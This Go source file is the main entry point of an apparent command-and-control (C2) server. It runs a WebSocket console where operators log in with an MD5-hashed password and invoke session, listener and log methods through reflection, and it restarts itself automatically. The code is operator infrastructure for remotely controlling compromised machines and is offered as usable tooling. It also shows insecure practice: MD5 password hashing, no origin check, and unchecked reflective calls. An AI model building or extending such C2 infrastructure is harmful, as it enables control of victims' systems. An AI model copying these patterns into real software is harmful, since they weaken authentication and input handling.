package main

import (
	"Server/CommandControl"
	"Server/Console"
	"Server/Public"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"github.com/gorilla/websocket"
	"log"
	"net/http"
	"os"
	"reflect"
	"time"
)

var objMapping = map[string]interface{}{
	"Log":            &Public.LogObj,
	"Session":        &CommandControl.SessionObj,
	"ListenerConfig": &Console.ListenerConfigObj,
}

var upgrader = websocket.Upgrader{}

// 即时通信 Goroutine
func IM_Route(w http.ResponseWriter, r *http.Request) {
	// 将 HTTP 升级为 WebSocket
	ip := r.RemoteAddr
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		Public.PrintLog("error", "WebSocket upgrade failed.\n"+err.Error())
		return
	}
	defer conn.Close()

	isLogin := true
	var loginInfo map[string]string
	for {
		_, msg, err := conn.ReadMessage() // 接收用户请求, 阻塞
		if err != nil {
			return
		}
		// 登录
		if isLogin {
			isLogin = false
			err := json.Unmarshal(msg, &loginInfo)
			if err != nil {
				Public.PrintLog("warning", "Login - Invalid data format from "+ip+".\n"+err.Error())
				return
			}
			if Public.UserInfoObj.Login(loginInfo, conn, ip) {
				continue
			} else {
				return
			}
		}
		// 反射调用
		var invokeInfo map[string]interface{}
		err = json.Unmarshal(msg, &invokeInfo)
		if err != nil {
			Public.PrintLog("warning", "ReflectInvoke - Invalid data format from "+ip+".\n"+err.Error())
			return
		}
		obj := objMapping[invokeInfo["obj"].(string)]
		funcObj, exists := reflect.TypeOf(obj).MethodByName(invokeInfo["func"].(string))
		if exists {
			args := []reflect.Value{reflect.ValueOf(obj), reflect.ValueOf(loginInfo["username"]), reflect.ValueOf(invokeInfo["paras"])}
			funcObj.Func.Call(args)
		}
	}
}

func main() {
	if len(os.Args) != 3 && len(os.Args) != 5 {
		log.Fatal("Usage: Server [port] [password] [crt] [key]\nExample:\nServer 7777 P@ssw0rd\nServer 7777 P@ssw0rd server.crt server.key")
	}
	port := os.Args[1]
	if len(os.Args[2]) < 8 {
		log.Fatal("The password is too short.")
	}
	hash := md5.Sum([]byte(os.Args[2]))
	Public.UserInfoObj.Password = hex.EncodeToString(hash[:])

	if !Public.InitDatabase() {
		return
	}
	CommandControl.ListenerObj.StartAllListeners()

	// 开启 HTTP 服务
	var err error
	http.HandleFunc("/", IM_Route)
	for {
		if len(os.Args) == 3 {
			Public.PrintLog("success", "ws://127.0.0.1:"+port)
			err = http.ListenAndServe(":"+port, nil)
		} else {
			Public.PrintLog("success", "wss://127.0.0.1:"+port)
			err = http.ListenAndServeTLS(":"+port, os.Args[3], os.Args[4], nil)
		}
		if err != nil {
			Public.PrintLog("error", "Auto restarting the C2 Server.\n"+err.Error())
		}
		time.Sleep(time.Second)
	}
}
